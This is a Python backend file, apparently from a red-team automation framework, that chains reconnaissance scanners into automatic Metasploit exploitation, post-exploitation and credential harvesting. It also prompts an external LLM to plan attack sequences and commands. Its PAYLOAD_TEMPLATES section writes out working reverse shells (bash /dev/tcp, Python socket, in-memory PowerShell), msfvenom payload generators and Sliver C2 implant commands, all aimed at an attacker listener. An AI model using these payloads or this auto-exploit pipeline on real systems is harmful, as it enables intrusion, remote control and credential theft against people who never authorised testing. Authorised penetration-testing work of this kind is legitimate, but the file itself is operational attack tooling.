            if any(x in line.lower() for x in ['critical', 'rce', 'injection']):
                severity = "critical"
            elif any(x in line.lower() for x in ['xss', 'sql']):
                severity = "high"
            vulns.append({"finding": line.strip(), "severity": severity})
    return {"vulnerabilities": vulns, "raw": output}

async def run_tool(tool_id: str, target: str) -> Dict[str, Any]:
    tool = RED_TEAM_TOOLS.get(tool_id)
    if not tool:
        return {"error": f"Unknown tool: {tool_id}"}
    try:
        cmd = tool["cmd"].format(target=target)
        result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=300)
        output = result.stdout + result.stderr
        if tool_id == "nmap":
            return parse_nmap_output(output)
        elif tool_id == "wafw00f":
            return parse_waf_output(output)
        elif tool_id == "nikto":
            return parse_nikto_output(output)
        return {"output": output}
    except FileNotFoundError:
        return {"simulated": True, "tool": tool_id, "phase": tool["phase"], "command": tool["cmd"].format(target=target)}
    except Exception as e:
        return {"error": str(e)}

async def run_metasploit(module: str, target: str, port: Optional[int], options: Dict, lhost: str = None, lport: int = 4444) -> Dict[str, Any]:
    effective_lhost = lhost or get_effective_lhost()
    effective_lport = lport or global_config.get("listener_port", 4444)
    rc_content = f"use {module}\nset RHOSTS {target}\n"
    if port:
        rc_content += f"set RPORT {port}\n"
    if effective_lhost:
        rc_content += f"set LHOST {effective_lhost}\n"
    if effective_lport:
        rc_content += f"set LPORT {effective_lport}\n"
    rc_content += "run\nexit\n"
    try:
        rc_file = f"/tmp/msf_{uuid.uuid4().hex[:8]}.rc"
        with open(rc_file, 'w') as f:
            f.write(rc_content)
        result = subprocess.run(["msfconsole", "-q", "-r", rc_file], capture_output=True, text=True, timeout=300)
        os.remove(rc_file)
        output = result.stdout + result.stderr
        success = "session" in output.lower() and "opened" in output.lower()
        return {"module": module, "success": success, "session_opened": success, "output": output, "rc_command": rc_content}
    except FileNotFoundError:
        return {"module": module, "simulated": True, "success": False, "rc_command": rc_content}
    except Exception as e:
        return {"error": str(e)}

async def get_tactical_ai_advice(results: Dict, target: str, tactical_analysis: Dict) -> Dict[str, Any]:
    if not KIMI_API_KEY:
        return {"analysis": "API key not configured", "exploits": []}
    prompt = f"""Eres un Red Team Operator experto. Analiza estos resultados y el analisis tactico para {target}:

RESULTADOS DEL ESCANEO:
{json.dumps(results, indent=2, default=str)[:3000]}

ANALISIS TACTICO AUTOMATICO:
{json.dumps(tactical_analysis, indent=2, default=str)}

Basandote en el analisis tactico, proporciona:
1. VALIDACION DEL ANALISIS TACTICO
2. AJUSTES AL PLAN
3. SECUENCIA DE ATAQUE OPTIMA
4. COMANDOS ESPECIFICOS
5. CONTINGENCIAS

Responde en espanol, se conciso y tactico."""
    try:
        async with httpx.AsyncClient(timeout=90.0) as http:
            response = await http.post(
                KIMI_API_URL,
                headers={"Authorization": f"Bearer {KIMI_API_KEY}", "Content-Type": "application/json"},
                json={"model": "kimi-k2-0711-preview", "messages": [
                    {"role": "system", "content": "Eres un Red Team operator. Se tactico y directo."},
                    {"role": "user", "content": prompt}
                ], "temperature": 0.3, "max_tokens": 4000}
            )
            if response.status_code == 200:
                data = response.json()
                ai_response = data["choices"][0]["message"]["content"]
                exploits = []
                for line in ai_response.split('\n'):
                    if 'use ' in line.lower() and ('exploit/' in line or 'auxiliary/' in line):
                        match = re.search(r'use\s+((?:exploit|auxiliary|post)/[^\s]+)', line, re.IGNORECASE)
                        if match:
                            exploits.append({"type": "metasploit", "module": match.group(1)})
                return {"analysis": ai_response, "exploits": exploits}
            return {"analysis": f"API Error: {response.status_code}", "exploits": []}
    except Exception as e:
        return {"analysis": f"Error: {str(e)}", "exploits": []}

def build_attack_tree(scan_id: str, target: str, results: Dict, phases: List[str], ai_data: Dict, tactical: Dict) -> Dict[str, Any]:
    tactical = tactical or {}
    tree = {
        "scan_id": scan_id,
        "root": {"id": "root", "type": "target", "name": target, "description": f"Target: {target}", "status": "testing", "children": []},
        "nodes": {}, "tactical_decisions": tactical
    }
    node_id = 0
    if (tactical.get("waf_analysis") or {}).get("waf_detected"):
        node_id += 1
        waf_node_id = f"waf_{node_id}"
        tree["nodes"][waf_node_id] = {
            "id": waf_node_id, "parent_id": "root", "type": "defense",
            "name": f"WAF: {tactical['waf_analysis']['waf_name']}",
            "description": tactical['waf_analysis']['alternative_approach'],
            "status": "pending", "severity": "high",
            "data": {"bypass_techniques": tactical['waf_analysis']['bypass_techniques']}, "children": []
        }
        tree["root"]["children"].append(waf_node_id)
        for tech in tactical['waf_analysis']['bypass_techniques']:
            node_id += 1
            tech_id = f"bypass_{node_id}"
            tree["nodes"][tech_id] = {
                "id": tech_id, "parent_id": waf_node_id, "type": "technique",
                "name": f"{tech['id']} - {tech['name']}", "description": tech['cmd'],
                "status": "pending", "severity": "medium", "mitre": tech['id'],
                "data": {"tools": tech['tools']}, "children": []
            }
            tree["nodes"][waf_node_id]["children"].append(tech_id)
    for action in tactical.get("priority_actions", []):
        node_id += 1
        action_id = f"priority_{node_id}"
        tree["nodes"][action_id] = {
            "id": action_id, "parent_id": "root", "type": "priority",
            "name": f"P{action['priority']}: {action['action']}",
            "description": action['details'],
            "status": "pending", "severity": "critical" if action['priority'] == 1 else "high",
            "data": action, "children": []
        }
        tree["root"]["children"].append(action_id)
    for tool_id_key, result in results.items():
        tool_info = RED_TEAM_TOOLS.get(tool_id_key, {})
        node_id += 1
        tool_node_id = f"tool_{node_id}"
        tree["nodes"][tool_node_id] = {
            "id": tool_node_id, "parent_id": "root", "type": "tool",
            "name": f"{tool_id_key.upper()}", "description": tool_info.get('desc', ''),
            "status": "completed" if not result.get("error") else "failed",
            "severity": "info", "mitre": tool_info.get('mitre'),
            "data": result, "children": []
        }
        tree["root"]["children"].append(tool_node_id)
    for exploit in ai_data.get("exploits", []):
        node_id += 1
        exp_id = f"exploit_{node_id}"
        tree["nodes"][exp_id] = {
            "id": exp_id, "parent_id": "root", "type": "exploit",
            "name": exploit.get("module", "Exploit"), "description": "",
            "status": "pending", "severity": "critical", "data": exploit, "children": []
        }
        tree["root"]["children"].append(exp_id)
    return tree


# =============================================================================
# MODULES
# =============================================================================
from modules.credential_vault import CredentialVault
from modules.session_manager import SessionManager

credential_vault = CredentialVault()
session_manager = SessionManager()


# =============================================================================
# GLOBAL CONFIG (SQLite-backed)
# =============================================================================
global_config: Dict[str, Any] = {
    "listener_ip": "", "listener_port": 4444, "c2_protocol": "tcp",
    "operator_name": "operator", "stealth_mode": False, "auto_lhost": True,
}

async def load_global_config():
    global global_config
    stored = await repo.config_get("operator_config")
    if stored and isinstance(stored, dict):
        global_config.update(stored)
    # Seed from env vars if not yet configured
    env_ip = os.environ.get("LISTENER_IP", "")
    env_port = os.environ.get("LISTENER_PORT", "")
    changed = False
    if env_ip and not global_config.get("listener_ip"):
        global_config["listener_ip"] = env_ip
        changed = True
    if env_port and not global_config.get("listener_port"):
        global_config["listener_port"] = int(env_port)
        changed = True
    if changed:
        await repo.config_set("operator_config", global_config)

def get_effective_lhost() -> str:
    return global_config.get("listener_ip", "") or ""


# =============================================================================
# SCAN LIMITS & BACKGROUND HANDLER
# =============================================================================
SCAN_LIMITS = {
    "max_tools": 20, "max_time_seconds": 600, "tool_timeout": 120,
    "pause_between_tools": 1, "max_consecutive_errors": 3,
    "aggressive_tools": ["nikto", "sqlmap", "hydra", "gobuster"],
    "stealth_tools": ["nmap", "wafw00f", "whatweb", "subfinder", "masscan"],
}


async def scan_job_handler(job_id: str, target: str, params: Dict):
    """Adaptive scan orchestration — runs as an async Job."""
    phases = params.get("phases", ["reconnaissance", "initial_access"])
    tools_requested = params.get("tools", [])
    scan_id = params.get("scan_id", job_id)
    start_time = time.time()

    scan_progress[scan_id] = {
        "status": "running", "current_tool": None, "progress": 0,
        "results": {}, "tactical_decisions": [], "ai_analysis": None,
        "timeline": [], "vault_summary": {}, "adaptive_log": []
    }

    effective_lhost = get_effective_lhost()
    credential_vault.update_context(scan_id, target=target, lhost=effective_lhost)

    initial_tools = tools_requested or [t for t, info in RED_TEAM_TOOLS.items() if info["phase"] in phases]
    recon_first = [t for t in initial_tools if t in SCAN_LIMITS["stealth_tools"]]
    aggressive_later = [t for t in initial_tools if t not in SCAN_LIMITS["stealth_tools"]]
    tool_queue = recon_first + aggressive_later

    executed_tools = set()
    consecutive_errors = 0
    tool_count = 0

    def log_timeline(event_type, detail, data=None):
        scan_progress[scan_id]["timeline"].append({
            "time": datetime.now(timezone.utc).isoformat(),
            "elapsed": round(time.time() - start_time, 1),
            "type": event_type, "detail": detail, "data": data or {}
        })

    def log_adaptive(decision, reason):
        scan_progress[scan_id]["adaptive_log"].append({
            "time": datetime.now(timezone.utc).isoformat(),
            "decision": decision, "reason": reason
        })

    try:
        log_timeline("start", f"Adaptive scan initiated for {target}", {"phases": phases})
        await repo.job_log(job_id, "info", f"Scan started: {target}", module="scan")

        # Create scan record in SQLite
        await repo.scan_create(scan_id, job_id, target, phases, list(tool_queue))

        while tool_queue and tool_count < SCAN_LIMITS["max_tools"]:
            elapsed = time.time() - start_time
            if elapsed > SCAN_LIMITS["max_time_seconds"]:
                log_adaptive("TIMEOUT", f"Time limit reached ({int(elapsed)}s)")
                break
            if consecutive_errors >= SCAN_LIMITS["max_consecutive_errors"]:
                log_adaptive("ERROR_LIMIT", f"{consecutive_errors} consecutive errors")
                break
            if scan_progress.get(scan_id, {}).get("status") == "aborted":
                log_adaptive("ABORTED", "User aborted scan")
                break

            tool_id = tool_queue.pop(0)
            if tool_id in executed_tools:
                continue

            waf_detected = any(
                (td.get("advice") or {}).get("waf_analysis") is not None
                and (td.get("advice") or {}).get("waf_analysis", {}).get("waf_detected", False)
                for td in scan_progress[scan_id]["tactical_decisions"]
            )
            if waf_detected and tool_id in SCAN_LIMITS["aggressive_tools"]:
                log_adaptive("SKIP", f"Skipping {tool_id} - WAF active")
                log_timeline("skip", f"Skipped {tool_id} due to WAF", {"reason": "waf_active"})
                continue

            scan_progress[scan_id]["current_tool"] = tool_id
            total_estimate = max(len(tool_queue) + len(executed_tools) + 3, 5)
            progress = int((len(executed_tools) / total_estimate) * 80)
            scan_progress[scan_id]["progress"] = progress
            await repo.job_update(job_id, progress=progress, current_step=tool_id)

            log_timeline("tool_start", f"Executing {tool_id}")
            await repo.job_log(job_id, "info", f"Running: {tool_id}", module="scan")

            result = await run_tool(tool_id, target)
            scan_progress[scan_id]["results"][tool_id] = result
            executed_tools.add(tool_id)
            tool_count += 1

            if result.get("error"):
                consecutive_errors += 1
                log_timeline("tool_error", f"{tool_id} failed: {result['error']}")
                await repo.job_log(job_id, "error", f"{tool_id} failed: {result['error']}", module="scan")
            else:
                consecutive_errors = 0
                log_timeline("tool_complete", f"{tool_id} completed")

            # Parse credentials
            output_text = ""
            if isinstance(result, dict):
                output_text = result.get("output", result.get("raw", ""))
            if isinstance(output_text, str) and output_text:
                found_creds = CredentialVault.parse_credentials_from_output(output_text, tool_id, target)
                for cred in found_creds:
                    credential_vault.add_credential(scan_id, cred)
                    log_timeline("credential", f"Found: {cred.get('type')} - {cred.get('username','?')}", cred)
                os_info = CredentialVault.detect_os_from_output(output_text)
                if os_info:
                    credential_vault.update_context(scan_id, os_info=os_info)

            # Session detection
            result_str = json.dumps(result) if isinstance(result, dict) else str(result)
            if (isinstance(result, dict) and result.get("session_opened")) or ("session" in result_str.lower() and "opened" in result_str.lower()):
                os_detected = (credential_vault.get_context(scan_id) or {}).get("os_info", {}).get("os", "unknown")
                session_manager.register(scan_id, {"id": f"s_{tool_count}", "host": target, "type": "shell", "source": tool_id, "platform": os_detected})
                log_timeline("session", f"Session opened via {tool_id}", {"host": target})

            # Tactical decision
            vault_ctx = credential_vault.get_context(scan_id)
            tactical = await TacticalDecisionEngine.get_tactical_advice(scan_progress[scan_id]["results"], target, vault_ctx)
            scan_progress[scan_id]["tactical_decisions"].append({"after_tool": tool_id, "advice": tactical})

            for skip_tool in tactical.get("skip_tools", []):
                if skip_tool in tool_queue:
                    tool_queue.remove(skip_tool)
                    log_adaptive("REMOVE", f"Removed {skip_tool} from queue")

            for add_tool in tactical.get("add_tools", []):
                if add_tool not in executed_tools and add_tool not in tool_queue and add_tool in RED_TEAM_TOOLS:
                    tool_queue.insert(0, add_tool)
                    log_adaptive("ADD", f"Added {add_tool} to queue")

            nba = tactical.get("next_best_action")
            if nba:
                if nba["action"] == "run_exploit" and nba.get("module"):
                    log_adaptive("EXPLOIT", f"Auto-running exploit: {nba['module']}")
                    log_timeline("auto_exploit", f"Tactical engine triggered: {nba['module']}")
                    exploit_result = await run_metasploit(nba["module"], target, None, {}, vault_ctx.get("lhost"), 4444)
                    scan_progress[scan_id]["results"][f"msf_{nba['module'].split('/')[-1]}"] = exploit_result
                    if exploit_result.get("session_opened"):
                        os_detected = (vault_ctx or {}).get("os_info", {}).get("os", "unknown")
                        session_manager.register(scan_id, {"id": f"msf_{tool_count}", "host": target, "type": "meterpreter", "source": nba["module"], "platform": os_detected})
                        log_timeline("session", f"Session from auto-exploit: {nba['module']}")
                    output_text = exploit_result.get("output", "") if isinstance(exploit_result, dict) else ""
                    if isinstance(output_text, str) and output_text:
                        for cred in CredentialVault.parse_credentials_from_output(output_text, nba["module"], target):
                            credential_vault.add_credential(scan_id, cred)
                elif nba["action"] == "run_tool" and nba.get("tool"):
                    tool_name = nba["tool"]
                    if tool_name not in executed_tools and tool_name not in tool_queue:
                        tool_queue.insert(0, tool_name)
                        log_adaptive("PRIORITIZE", f"Prioritized {tool_name}: {nba.get('reason','')}")
                elif nba["action"] == "post_exploit" and session_manager.has_active(scan_id):
                    post_actions = session_manager.get_post_exploit_actions(scan_id)
                    for pa in post_actions[:3]:
                        if pa.get("module"):
                            log_adaptive("POST_EXPLOIT", f"Running: {pa['module']}")
                            pe_result = await run_metasploit(pa["module"], target, None, {}, None, 4444)
                            scan_progress[scan_id]["results"][f"post_{pa['action']}"] = pe_result

            chain_trigger = tactical.get("trigger_chain")
            if chain_trigger and chain_trigger.get("confidence", 0) >= 0.5:
                log_adaptive("CHAIN_TRIGGER", f"Auto-triggering chain: {chain_trigger['chain_id']} (confidence: {chain_trigger['confidence']:.0%})")
                scan_progress[scan_id]["auto_triggered_chain"] = chain_trigger

            await asyncio.sleep(SCAN_LIMITS["pause_between_tools"])

        # Post-loop: Final analysis
        scan_progress[scan_id]["current_tool"] = "tactical_engine"
        scan_progress[scan_id]["progress"] = 85
        await repo.job_update(job_id, progress=85, current_step="tactical_engine")

        final_tactical = await TacticalDecisionEngine.get_tactical_advice(scan_progress[scan_id]["results"], target, credential_vault.get_context(scan_id))
        scan_progress[scan_id]["final_tactical"] = final_tactical

        scan_progress[scan_id]["current_tool"] = "kimi_ai"
        scan_progress[scan_id]["progress"] = 90
        await repo.job_update(job_id, progress=90, current_step="kimi_ai")
        await repo.job_log(job_id, "info", "Running AI analysis...", module="scan")

        ai_result = await get_tactical_ai_advice(scan_progress[scan_id]["results"], target, final_tactical)
        scan_progress[scan_id]["ai_analysis"] = ai_result["analysis"]
        scan_progress[scan_id]["exploits"] = ai_result.get("exploits", [])

        attack_tree = build_attack_tree(scan_id, target, scan_progress[scan_id]["results"], phases, ai_result, final_tactical)
        scan_progress[scan_id]["attack_tree"] = attack_tree
        attack_trees[scan_id] = attack_tree

        scan_progress[scan_id]["status"] = "completed"
        scan_progress[scan_id]["progress"] = 100

        suggested_chains = AttackChainEngine.get_applicable_chains(scan_progress[scan_id]["results"])
        scan_progress[scan_id]["suggested_chains"] = suggested_chains

        recommended_modules = get_recommended_modules(scan_progress[scan_id]["results"], final_tactical)
        scan_progress[scan_id]["recommended_modules"] = recommended_modules

        scan_progress[scan_id]["vault_summary"] = credential_vault.get_vault_summary(scan_id)
        await credential_vault.save_to_db(scan_id)

        log_timeline("complete", f"Scan complete. Tools: {tool_count}, Creds: {len(credential_vault.get_credentials(scan_id))}")

        # Persist scan to SQLite
        await repo.scan_update(scan_id,
            status="completed",
            results=scan_progress[scan_id]["results"],
            ai_analysis=json.dumps({"analysis": scan_progress[scan_id]["ai_analysis"], "exploits": scan_progress[scan_id].get("exploits", [])}),
            attack_tree=attack_tree,
            suggested_chains=suggested_chains,
            recommended_modules=recommended_modules,
            vault=scan_progress[scan_id]["vault_summary"],
            timeline=scan_progress[scan_id]["timeline"],
            progress=100,
            finished_at=datetime.now(timezone.utc).isoformat()
        )
        await repo.job_log(job_id, "info", "Scan completed successfully", module="scan")

        return {"scan_id": scan_id, "status": "completed", "tool_count": tool_count}

    except Exception as e:
        import traceback
        logger.error(f"Scan error: {str(e)}")
        logger.error(traceback.format_exc())
        scan_progress[scan_id]["status"] = "error"
        scan_progress[scan_id]["error"] = str(e)
        log_timeline("error", str(e))
        await repo.scan_update(scan_id, status="error")
        raise


def get_recommended_modules(results: Dict, tactical: Dict) -> List[Dict]:
    recommended = []
    results_text = json.dumps(results).lower()
    tactical_text = json.dumps(tactical).lower()
    combined = results_text + " " + tactical_text
    for mod in METASPLOIT_MODULES:
        score = 0
        reasons = []
        mod_name_lower = mod["name"].lower()
        mod_desc_lower = mod["desc"].lower()
        if "smb" in combined and "smb" in mod_name_lower:
            score += 3; reasons.append("SMB service detected")
        if "ssh" in combined and "ssh" in mod_name_lower:
            score += 3; reasons.append("SSH service detected")
        if ("http" in combined or "80/tcp" in combined) and "http" in mod_name_lower:
            score += 2; reasons.append("HTTP service detected")
        if "rdp" in combined and "rdp" in mod_name_lower:
            score += 3; reasons.append("RDP service detected")
        if "shellshock" in combined and "shellshock" in mod_desc_lower:
            score += 5; reasons.append("Shellshock vulnerability found")
        if "eternalblue" in combined and "eternalblue" in mod_desc_lower:
            score += 5; reasons.append("EternalBlue vulnerability found")
        if "log4" in combined and "log4" in mod_desc_lower:
            score += 5; reasons.append("Log4Shell vulnerability found")
        if mod["rank"] == "excellent":
            score += 1
        if score > 0:
            recommended.append({**mod, "relevance_score": score, "reasons": reasons})
    recommended.sort(key=lambda x: x["relevance_score"], reverse=True)
    return recommended


# =============================================================================
# PAYLOAD TEMPLATES
# =============================================================================
PAYLOAD_TEMPLATES = {
    "windows/meterpreter/reverse_tcp": {"name": "Windows Meterpreter Reverse TCP", "platform": "windows", "arch": "x64", "type": "staged", "generator": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}", "handler": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j\"", "output_ext": "exe", "description": "Staged Meterpreter. Requires handler listening."},
    "windows/meterpreter/reverse_https": {"name": "Windows Meterpreter Reverse HTTPS", "platform": "windows", "arch": "x64", "type": "staged", "generator": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={lhost} LPORT={lport} -f exe -o {output}", "handler": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j\"", "output_ext": "exe", "description": "Encrypted HTTPS channel."},
    "windows/shell_reverse_tcp": {"name": "Windows Shell Reverse TCP", "platform": "windows", "arch": "x64", "type": "stageless", "generator": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}", "handler": "nc -lvnp {lport}", "output_ext": "exe", "description": "Simple CMD shell."},
    "linux/shell_reverse_tcp": {"name": "Linux Shell Reverse TCP", "platform": "linux", "arch": "x64", "type": "stageless", "generator": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {output}", "handler": "nc -lvnp {lport}", "output_ext": "elf", "description": "ELF binary reverse shell."},
    "linux/meterpreter/reverse_tcp": {"name": "Linux Meterpreter Reverse TCP", "platform": "linux", "arch": "x64", "type": "staged", "generator": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {output}", "handler": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit -j\"", "output_ext": "elf", "description": "Linux Meterpreter."},
    "php/reverse_php": {"name": "PHP Reverse Shell", "platform": "php", "arch": "any", "type": "stageless", "generator": "msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw -o {output}", "handler": "nc -lvnp {lport}", "output_ext": "php", "description": "PHP web shell for upload vulns."},
    "bash_reverse": {"name": "Bash One-Liner Reverse Shell", "platform": "linux", "arch": "any", "type": "oneliner", "generator": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1", "handler": "nc -lvnp {lport}", "output_ext": None, "description": "No binary needed."},
    "python_reverse": {"name": "Python Reverse Shell", "platform": "any", "arch": "any", "type": "oneliner", "generator": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "handler": "nc -lvnp {lport}", "output_ext": None, "description": "Cross-platform."},
    "powershell_reverse": {"name": "PowerShell Reverse Shell", "platform": "windows", "arch": "any", "type": "oneliner", "generator": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}}\"", "handler": "nc -lvnp {lport}", "output_ext": None, "description": "No binary drop. Runs in memory."},
    "sliver_session": {"name": "Sliver Session Implant", "platform": "linux", "arch": "amd64", "type": "implant", "generator": "sliver > generate --mtls {lhost}:{lport} --os {platform} --arch {arch} --save {output}", "handler": "sliver > mtls --lhost {lhost} --lport {lport}", "output_ext": "elf", "description": "Sliver C2 implant."},
    "sliver_beacon": {"name": "Sliver Beacon Implant", "platform": "linux", "arch": "amd64", "type": "implant", "generator": "sliver > generate beacon --mtls {lhost}:{lport} --os {platform} --arch {arch} --seconds 60 --jitter 30 --save {output}", "handler": "sliver > mtls --lhost {lhost} --lport {lport}", "output_ext": "elf", "description": "Sliver C2 beacon."},
}


def sanitize_for_pdf(text: str) -> str:
    if not text:
        return ""
    replacements = {'->': '->', '<-': '<-', '<->': '<->', '*': '*', '-': '-', '-': '-', '"': '"', '"': '"', "'": "'", "'": "'", '...': '...', '[OK]': '[OK]', '[X]': '[X]', '*': '*', '*': '*', '#': '#', '#': '#', '.': '.', '=': '=', '|': '|', '+': '+', '+': '+', '+': '+', '+': '+', '+': '+', '+': '+', '+': '+', '+': '+', '+': '+'}
    try:
        return text.encode('latin-1', errors='replace').decode('latin-1')
    except Exception:
        return text.encode('ascii', errors='replace').decode('ascii')


# =============================================================================
# API ROUTES
# =============================================================================

@api_router.get("/")
async def root():
    return {"message": "Red Team Automation Framework", "version": "6.0.0-local", "architecture": "local-first", "database": "sqlite"}


# ============ HEALTH (fast) ============

@api_router.get("/health")
async def health():
    db_ok = await repo.is_healthy()
    try:
        msf_connected = await asyncio.wait_for(
            asyncio.get_event_loop().run_in_executor(None, msf_module.is_connected),
            timeout=2
        )
    except Exception:
        msf_connected = False
    checks = {
        "database": {"engine": "sqlite", "path": config.db_path, "status": "connected" if db_ok else "error"},
        "msf_rpc": {"host": MSF_RPC_HOST, "port": MSF_RPC_PORT, "token_set": bool(MSF_RPC_TOKEN), "connected": msf_connected},
        "sliver": {"config_path": SLIVER_CONFIG_PATH, "connected": sliver_module.is_connected()},
        "listener": {"ip": global_config.get("listener_ip", ""), "port": global_config.get("listener_port", 4444), "configured": bool(global_config.get("listener_ip"))},
        "active_jobs": await jobs.list_active(),
    }
    return {"status": "healthy" if db_ok else "degraded", "checks": checks}


# ============ DOCTOR (deep diagnostic) ============

@api_router.get("/doctor")
async def doctor():
    diag = {"database": {}, "integrations": {}, "config": {}, "hints": []}

    # DB check
    db_ok = await repo.is_healthy()
    diag["database"] = {"engine": "sqlite", "path": config.db_path, "healthy": db_ok}
    if not db_ok:
        diag["hints"].append("Database connection failed. Check DB_PATH in .env")

    # Config validation
    diag["config"] = {"mode": config.app_mode, "warnings": config.warnings, "errors": config.errors}
    for w in config.warnings:
        diag["hints"].append(f"Config warning: {w}")

    # MSF RPC
    msf_ok = msf_module.is_connected()
    diag["integrations"]["metasploit"] = {"connected": msf_ok, "host": MSF_RPC_HOST, "port": MSF_RPC_PORT}
    if not msf_ok and MSF_RPC_TOKEN:
        diag["hints"].append(f"MSF RPC not connected. Ensure msfrpcd is running: msfrpcd -P {MSF_RPC_TOKEN} -S -a {MSF_RPC_HOST} -p {MSF_RPC_PORT}")
    elif not MSF_RPC_TOKEN:
        diag["hints"].append("MSF_RPC_TOKEN not set. Metasploit integration disabled (optional).")

    # Sliver
    sliver_ok = sliver_module.is_connected()
    diag["integrations"]["sliver"] = {"connected": sliver_ok, "config_path": SLIVER_CONFIG_PATH}
    if not sliver_ok and SLIVER_CONFIG_PATH:
        diag["hints"].append(f"Sliver not connected. Check config: {SLIVER_CONFIG_PATH}")
    elif not SLIVER_CONFIG_PATH:
        diag["hints"].append("SLIVER_CONFIG_PATH not set. Sliver integration disabled (optional).")

    # AI
    diag["integrations"]["kimi_ai"] = {"configured": bool(KIMI_API_KEY)}
    if not KIMI_API_KEY:
        diag["hints"].append("KIMI_API_KEY not set. AI analysis disabled (optional).")

    # Tools
    tool_checks = {}
    for tool_name in ["nmap", "nikto", "sqlmap", "hydra", "msfvenom"]:
        try:
            subprocess.run(["which", tool_name], capture_output=True, timeout=5)
            tool_checks[tool_name] = True
        except Exception:
            tool_checks[tool_name] = False
    diag["tools"] = tool_checks
    missing = [t for t, ok in tool_checks.items() if not ok]
    if missing:
        diag["hints"].append(f"Missing tools: {', '.join(missing)}. Install with: sudo apt install {' '.join(missing)}")

    return diag


# ============ JOB ENDPOINTS (NEW) ============

@api_router.post("/jobs/{job_type}/start")
async def start_job(job_type: str, data: Dict[str, Any] = {}):
    """Start an async job. Returns job_id immediately."""
    target = data.get("target", "")

    if job_type == "scan":
        scan_id = str(uuid.uuid4())
        params = {
            "scan_id": scan_id,
            "phases": data.get("scan_phases", data.get("phases", ["reconnaissance", "initial_access"])),
            "tools": data.get("tools", []),
        }
        target = target.strip().replace("https://", "").replace("http://", "").split("/")[0]
        result = await jobs.submit("scan", scan_job_handler, target=target, params=params)
        result["scan_id"] = scan_id
        return result
    else:
        raise HTTPException(status_code=400, detail=f"Unknown job type: {job_type}")


@api_router.get("/jobs")
async def list_jobs(status: str = None, job_type: str = None):
    """List jobs with optional filters."""
    job_list = await repo.job_list(status=status, job_type=job_type)
    active = await jobs.list_active()
    return {"jobs": job_list, "active_job_ids": active}


@api_router.get("/jobs/{job_id}")
async def get_job(job_id: str):
    """Get job status with recent logs."""
    result = await jobs.get_status(job_id)
    if not result:
        raise HTTPException(status_code=404, detail="Job not found")
    return result


@api_router.post("/jobs/{job_id}/cancel")
async def cancel_job(job_id: str):
    """Cancel a running job."""
    cancelled = await jobs.cancel(job_id)
    if cancelled:
        return {"status": "cancelled", "job_id": job_id}
    raise HTTPException(status_code=400, detail="Job not running or not found")


@api_router.get("/jobs/{job_id}/logs")
async def get_job_logs(job_id: str, limit: int = 200):
    """Get logs for a specific job."""
    logs = await repo.job_logs_get(job_id, limit=limit)
    return {"job_id": job_id, "logs": logs}


# ============ GLOBAL CONFIG ENDPOINTS ============

@api_router.get("/config")
async def get_config():
    return {**global_config}

@api_router.put("/config")
async def update_config(data: Dict[str, Any]):
    global global_config
    allowed_keys = {"listener_ip", "listener_port", "c2_protocol", "operator_name", "stealth_mode", "auto_lhost"}
    updates = {k: v for k, v in data.items() if k in allowed_keys}
    global_config.update(updates)
    await repo.config_set("operator_config", global_config)
    return {"status": "updated", "config": {**global_config}}


# ============ SCAN ENDPOINTS (backwards compatible + job-based) ============

@api_router.post("/scan/start")
async def start_scan(scan: ScanCreate, background_tasks: BackgroundTasks):
    """Start a scan via the Job system. Returns scan_id AND job_id."""
    scan_id = str(uuid.uuid4())
    target = scan.target.strip().replace("https://", "").replace("http://", "").split("/")[0]
    params = {"scan_id": scan_id, "phases": scan.scan_phases, "tools": scan.tools}
    result = await jobs.submit("scan", scan_job_handler, target=target, params=params)
    return {"scan_id": scan_id, "job_id": result["job_id"], "target": target, "phases": scan.scan_phases, "status": "started"}

@api_router.get("/scan/{scan_id}/status")
async def get_scan_status(scan_id: str):
    if scan_id in scan_progress:
        p = scan_progress[scan_id]
        return {
            "scan_id": scan_id, "status": p["status"], "current_tool": p["current_tool"],
            "progress": p["progress"], "results": p["results"],
            "tactical_decisions": p.get("tactical_decisions", []),
            "final_tactical": p.get("final_tactical"),
            "ai_analysis": p.get("ai_analysis"), "exploits": p.get("exploits", []),
            "attack_tree": p.get("attack_tree"),
            "suggested_chains": p.get("suggested_chains", []),
            "recommended_modules": p.get("recommended_modules", []),
            "vault_summary": p.get("vault_summary", {}),
            "timeline": p.get("timeline", []),
            "adaptive_log": p.get("adaptive_log", []),
            "auto_triggered_chain": p.get("auto_triggered_chain")
        }
    scan = await repo.scan_get(scan_id)
    if scan:
        ai_analysis_data = scan.get("ai_analysis") or {}
        if isinstance(ai_analysis_data, str):
            try:
                ai_analysis_data = json.loads(ai_analysis_data)
            except Exception:
                ai_analysis_data = {"analysis": ai_analysis_data, "exploits": []}
        return {
            "scan_id": scan_id, "status": scan["status"], "current_tool": None,
            "progress": 100, "results": scan.get("results", {}),
            "tactical_decisions": [],
            "final_tactical": None,
